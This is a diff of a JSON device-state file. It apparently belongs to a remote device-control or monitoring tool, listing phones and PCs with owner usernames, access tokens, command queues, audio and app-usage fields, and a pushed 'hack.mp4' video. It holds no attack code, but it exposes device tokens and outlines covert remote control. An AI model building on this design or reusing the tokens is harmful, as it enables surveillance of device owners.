@@ -18110,7 +18110,7 @@
     "token": "d4cc7e716253bec88445004d626d775f",
     "lastSeen": 1777478330481,
     "commandQueue": [],
-    "online": true,
+    "online": false,
     "connectedAt": "2026-04-29T15:47:50.690Z",
     "deviceInfo": {
       "model": "TECNO MOBILE LIMITED TECNO LE7",
@@ -18141,7 +18141,7 @@
     "deviceName": "HP-ZAL7SEX-67C3",
     "ownerUsername": "Zal7Sex",
     "token": "228585cf435485e2101335e5900a661b",
-    "lastSeen": 1777478498130,
+    "lastSeen": 1777478515872,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T16:01:38.130Z",
@@ -18166,6 +18166,11 @@
     "lastAudio": null,
     "audioList": [],
     "lastAppUsage": null,
-    "appList": null
+    "appList": null,
+    "pendingVideo": {
+      "assetPath": "assets/video/hack.mp4",
+      "mimeType": "video/mp4",
+      "startedAt": 1777478511661
+    }
   }
 ]
